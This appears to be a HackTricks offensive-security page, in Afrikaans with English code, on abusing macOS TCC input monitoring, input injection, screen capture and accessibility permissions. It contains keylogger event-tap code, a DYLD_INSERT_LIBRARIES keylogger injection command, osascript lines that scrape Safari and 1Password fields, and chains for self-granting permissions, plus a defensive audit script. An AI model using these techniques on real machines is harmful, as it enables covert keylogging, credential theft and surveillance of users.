# macOS-invoermonitering, skermvaslegging en misbruik van toeganklikheid

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Drie verwante TCC-dienste beheer hoe toepassings die gebruiker se lessenaarsessie kan waarneem en daarmee kan interaksie hê:

| TCC Service | Toestemming | Vermoë |
|---|---|---|
| `kTCCServiceListenEvent` | **Invoermonitering** | Lees alle sleutelbord- en muisgebeure stelselwyd (keylogging) |
| `kTCCServicePostEvent` | **Invoerinspuiting** | Spuit sintetiese sleutelbord- en muisgebeure in |
| `kTCCServiceScreenCapture` | **Skermvaslegging** | Lees die skermbuffer, neem skermskote en neem die skerm op |
| `kTCCServiceAccessibility` | **Toeganklikheid** | Beheer ander toepassings via die AXUIElement API en lees UI-elemente |

Hierdie toestemmings is **die gevaarlikste kombinasie** op macOS — saam bied hulle:
- Volledige keylogging van elke sleuteldruk (wagwoorde, boodskappe, kredietkaarte)
- Skermopname van alle sigbare inhoud
- Sintetiese invoerinspuiting (klik knoppies, keur dialoë goed)
- Volledige GUI-beheer gelykstaande aan fisiese toegang

---

## Invoermonitering (kTCCServiceListenEvent)

### Hoe Dit Werk

macOS gebruik die **`CGEventTap` API** om prosesse toe te laat om invoergebeure van die Quartz-gebeurtenisstelsel te onderskep. ’n Proses met ListenEvent-toestemming kan ’n event tap skep wat **elke sleutelbord- en muisgebeurtenis** ontvang voordat of nadat dit die teikentoepassing bereik.<sup>[[1]](#references)</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Vind Binaries met Entitlements
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: Keylogging via Code Injection

As ’n binary met ListenEvent-permission ook **disabled library validation** het of **DYLD environment variables** toelaat, kan ’n aanvaller ’n dylib inspuit wat ’n CGEventTap registreer:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
The injected dylib erf die teiken se ListenEvent TCC-toestemming en vang alle sleuteldrukke vas.

### Attack: Credential Harvesting

’n Gesofistikeerde keylogger kan sleuteldrukke met die aktiewe toepassing korreleer:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Invoerinspuiting (kTCCServicePostEvent)

### Hoe dit werk

PostEvent-toestemming laat toe dat ’n event tap met **`kCGEventTapOptionDefault`** (kan events wysig/insput) in plaas van ListenOnly geskep word.<sup>[[1]](#references)</sup> Dit maak die volgende moontlik:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Aanval: Automated TCC Prompt Approval

Met PostEvent kan 'n aanvaller **'n klik op "Allow"** op TCC-toestemmingsdialoogvensters simuleer:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Skermvaslegging (kTCCServiceScreenCapture)

### Hoe Dit Werk

Skermvasleggings toestemming laat lees van die vertoonbuffer toe deur:
- **`CGWindowListCreateImage`** — vang enige venster of die volle skerm vas
- **`ScreenCaptureKit`** (macOS 12.3+) — moderne API vir die stroom van skerminhoud<sup>[[3]](#references)</sup>
- **`CGDisplayStream`** — hardeware-versnelde skermvaslegging
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Vind kliënte vir skermvaslegging
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Aanval: Credential Capture via OCR

'n Geïnjekteerde screen capture-proses kan periodiek rame vaslê en OCR gebruik om wagwoorde te onttrek:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> Vanaf **macOS Sonoma** wys screen capture ’n **aanhoudende aanduiding** in die menubalk. Op ouer weergawes kon screen recording heeltemal stil wees. ’n Kort vaslegging van ’n enkele raam kan egter steeds onopgemerk deur gebruikers bly.

### Attack: Session Recording

Deurlopende screen recording verskaf ’n volledige herhaling van die gebruiker se sessie:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Toeganklikheid (kTCCServiceAccessibility)

### Hoe Dit Werk

Toeganklikheidstoegang verleen beheer oor ander toepassings via die **AXUIElement API**.<sup>[[2]](#references)</sup> ’n Proses met toeganklikheid kan:

1. **Lees** enige UI-element in enige toepassing (teksvelde, etikette, knoppies, kieslyste)
2. **Klik** op knoppies en interaksie hê met kontroles
3. **Tik** teks in enige teksveld
4. **Navigeer** deur kieslyste en dialoogvensters
5. **Onttrek** vertoonde data uit enige toepassing wat loop
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Aanval: Selftoekenning van TCC-toestemmings

Die gevaarlikste misbruik van Toeganklikheid is **om deur Stelselinstellings te navigeer om jou eie malware bykomende toestemmings te gee**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Aanval: Data-skraping oor toepassings heen
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Aanval: Geoutomatiseerde Gebruikersaksies
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Aanvalskettings

### Ketting: Input Monitoring + Screen Capture = Volledige Toesig
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Ketting: Toeganklikheid + PostEvent = Volledige afstandbeheer
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Chain: Toeganklikheid → Self-Grant Camera/Mic → Toesig
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Opsporing en Enumerasie
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Verwysings

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
